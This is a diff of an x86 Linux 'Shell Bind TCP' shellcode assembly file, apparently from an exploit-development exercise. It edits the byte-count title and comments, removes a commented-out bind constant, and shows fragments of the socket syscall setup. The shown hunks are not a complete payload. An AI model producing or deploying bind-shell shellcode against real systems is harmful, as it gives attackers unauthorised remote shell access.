@@ -1,4 +1,4 @@
-; Title: Shell Bind TCP Shellcode - 24 byte
+; Title: Shell Bind TCP Shellcode - 96 byte
 ; Platform: linux/x86
 ; Date: 2015-01-04
 ; Author: Dennis 'dhn' Herrmann
@@ -18,7 +18,6 @@ SYS_DUP2       equ 0x3f
 
 ; /usr/include/linux/net.h
 SYS_SOCKET     equ 0x01
-; SYS_BIND       equ 0x02
 SYS_LISTEN     equ 0x04
 SYS_ACCEPT     equ 0x05
 
@@ -29,7 +28,7 @@ AF_INET        equ 0x02
 SOCK_STREAM    equ 0x01
 
 _start:
-	; Shell Bind TCP Shellcode (102 Byte)
+	; Shell Bind TCP Shellcode (96 Byte)
 
 socket:
 	; socket(AF_INET, SOCK_STREAM, IPPROTO_IP);
@@ -68,7 +67,7 @@ socket:
 	xchg ebx, eax          ; change ebx against eax
 	mov al, SYS_SOCKETCALL ; syscall 0x66
 
-	;  struct:
+	;  struct: [AF_INET, PORT, INADDR_ANY]
 	;     - sin_family: AF_INET     IPv4 Internet protocols
 	;     - sin_port:   PORT        See settings in top of the file
 	;     - sin_ip:     INADDR_ANY  Local IP (0.0.0.0 - 0x00000000)
